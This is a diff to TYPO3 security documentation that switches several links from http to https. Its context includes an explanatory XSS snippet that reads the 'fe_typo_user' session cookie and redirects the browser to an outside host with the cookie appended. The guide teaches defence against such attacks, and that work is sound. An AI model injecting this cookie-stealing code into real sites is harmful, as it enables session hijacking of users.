@@ -7,7 +7,7 @@ TypoScript
 SQL injection
 """""""""""""
 
-The `CWE/SANS list <http://cwe.mitre.org/top25/>`_ of top 25 most dangerous software
+The `CWE/SANS list <https://cwe.mitre.org/top25/>`_ of top 25 most dangerous software
 errors ranks "SQL injection" first! The TYPO3 Security Team comes across this security
 vulnerability in TYPO3 extensions over and over again.
 
@@ -84,7 +84,7 @@ snippet gives an example:
          // submit cookie data to another host
          if (key == 'fe_typo_user') {
            setTimeout(function() {
-             loc = 'http://www.google.com/?q=' + loc.hostname ;
+             loc = 'https://www.google.com/?q=' + loc.hostname ;
              window.location = loc + ':' + unescape(key) + ':' + unescape(data);
            }, 5000);
          }
@@ -173,7 +173,7 @@ Integrity of external JavaScript files
 The TypoScript property :code:`integrity` has been introduced with TYPO3 v7. This
 configuration allows integrators to specify a SRI hash in order to allow a verification
 of the integrity of externally hosted JavaScript files. SRI (Sub-Resource Integrity) is a
-`W3C specification <http://www.w3.org/TR/SRI/>`_ that allows web developers to ensure
+`W3C specification <https://www.w3.org/TR/SRI/>`_ that allows web developers to ensure
 that resources hosted on third-party servers have not been tampered with.
 
 The TypoScript property can be used for the following :ref:`PAGE <t3tsref:page>` properties:
